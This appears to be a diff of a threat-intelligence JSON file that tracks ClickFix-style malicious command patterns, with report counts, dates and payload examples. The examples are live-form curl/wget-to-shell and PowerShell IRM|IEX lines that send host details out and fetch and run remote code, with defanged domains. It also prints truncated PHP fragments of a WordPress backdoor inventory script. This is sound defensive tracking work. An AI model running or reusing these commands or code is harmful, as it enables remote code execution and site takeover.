@@ -495,12 +495,11 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 65,
-    "ReportCount": 65,
-    "FirstSeen": "2026-11-11T14:47:25.243000+00:00",
+    "DistinctPayloadCount": 64,
+    "ReportCount": 64,
+    "FirstSeen": "2026-11-11T16:56:48.024000+00:00",
     "LastSeen": "2026-11-18T05:54:34.402000+00:00",
     "ReportIds": [
-      "cmwc8ghte05n20omlrpl5slpy",
       "cmwcd2vl707b60omlre2bbg8k",
       "cmwd4xgzr00qh0oml10gmmayh",
       "cmwdz32o206wn0omluye82wa5",
@@ -567,7 +566,6 @@
       "cmwlpi7kr1pyj0omlfmun9v6q"
     ],
     "PayloadExamples": [
-      "curl -sL -d \"id=0048088b-86c5-4092-8adf-ae27e12f8b11&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcompany-hamza-abbs[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T14%3A45%3A29.831Z&lastShellAt=2026-11-11T14%3A45%3A29.831Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=02d53a6c-d6f4-4efc-ba96-cfb140983689&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fabdulwahabembroidery[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A58%3A44.911Z&lastShellAt=2026-11-15T03%3A58%3A44.911Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=077c70e0-cd50-430b-8669-85e85fa0ebf0&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fblancoybrasil[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-12T05%3A54%3A59.593Z&lastShellAt=2026-11-12T05%3A54%3A59.593Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=1da1078c-2d02-4bde-aa2b-14bf45cac2e9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fvantaiminhthanh.com.vn%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A45%3A50.990Z&lastShellAt=2026-11-16T04%3A45%3A50.990Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
@@ -682,9 +680,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 10,
-    "ReportCount": 99,
+    "ReportCount": 100,
     "FirstSeen": "2026-11-11T15:41:37.171000+00:00",
-    "LastSeen": "2026-11-18T14:18:19.279000+00:00",
+    "LastSeen": "2026-11-18T14:54:44.454000+00:00",
     "ReportIds": [
       "cmwcae70a068n0omlkip0wlqq",
       "cmwcaflcb069j0omlaoubq6f8",
@@ -784,7 +782,8 @@
       "cmwlpm0d71qfe0oml8871qi6j",
       "cmwlwpykb1qs60omlzij10hkx",
       "cmwm6nfdo1scb0omllphe87cz",
-      "cmwm7i18s1sda0omler9ihr8u"
+      "cmwm7i18s1sda0omler9ihr8u",
+      "cmwm8sw3e1sgr0omlknxj3rm2"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -826,24 +825,6 @@
       "$tok='uhp5i5k-CQBKaraPgYTHkA86HhVD_GgzXeO6FXd2-ZE';$id='6b84c10845efd51f';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='w12RZCGUfbGwNtu-O5H-263-W-9YfmOgTIMX2C3GEmw';$id='6cc5363fc43fc247';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
       "$tok='yah2iEFaPyhimG7ss0RTZf2K_qS2Bfxb95lpaVMsR3A';$id='53d15739a06f79a2';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
-    ]
-  },
-  {
-    "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
-    "DistinctPayloadCount": 3,
-    "ReportCount": 4,
-    "FirstSeen": "2026-11-11T14:47:59.979000+00:00",
-    "LastSeen": "2026-11-17T16:32:43.152000+00:00",
-    "ReportIds": [
-      "cmwc8h8ly05p60omloemc6t0j",
-      "cmwd9bnf802hk0omlsqvlimv7",
-      "cmwe912g309r10oml56qzo8en",
-      "cmwkwv0pz1gqc0omlgxi8bnwj"
-    ],
-    "PayloadExamples": [
-      "(irm 'https://cosmical2049[.]com/lom3/0ad7a0bdad0aa13d' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex",
-      "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
-      "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
     ]
   },
   {
@@ -948,19 +929,19 @@
     ]
   },
   {
-    "Pattern": "iex(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})",
+    "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
     "DistinctPayloadCount": 2,
     "ReportCount": 3,
-    "FirstSeen": "2026-11-11T14:38:38.104000+00:00",
-    "LastSeen": "2026-11-16T04:50:07.143000+00:00",
+    "FirstSeen": "2026-11-12T07:59:24.865000+00:00",
+    "LastSeen": "2026-11-17T16:32:43.152000+00:00",
     "ReportIds": [
-      "cmwc8571t05i70omlhp2zg2vc",
-      "cmwirqa5812v00omlaqvzahy1",
-      "cmwisbmad13t00oml3tkejeim"
+      "cmwd9bnf802hk0omlsqvlimv7",
+      "cmwe912g309r10oml56qzo8en",
+      "cmwkwv0pz1gqc0omlgxi8bnwj"
     ],
     "PayloadExamples": [
-      "iex(irm 'https://copiose[.]org/lom/62a9405c9735a1a7' -UserAgent 'WUA/8382bc918d' -Headers @{'X-WUA'='8382bc918d'})",
-      "iex(irm 'https://cosmical2049[.]com/crabs/6414f8e8174928f0' -UserAgent 'WUA/39587ecfe2' -Headers @{'X-WUA'='39587ecfe2'})"
+      "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
+      "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
     ]
   },
   {
@@ -1086,6 +1067,20 @@
     ],
     "PayloadExamples": [
       "Invoke-WebRequest \"https://swingerwives[.]com\" -OutFile $z"
+    ]
+  },
+  {
+    "Pattern": "iex(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-16T04:33:31.622000+00:00",
+    "LastSeen": "2026-11-16T04:50:07.143000+00:00",
+    "ReportIds": [
+      "cmwirqa5812v00omlaqvzahy1",
+      "cmwisbmad13t00oml3tkejeim"
+    ],
+    "PayloadExamples": [
+      "iex(irm 'https://cosmical2049[.]com/crabs/6414f8e8174928f0' -UserAgent 'WUA/39587ecfe2' -Headers @{'X-WUA'='39587ecfe2'})"
     ]
   },
   {
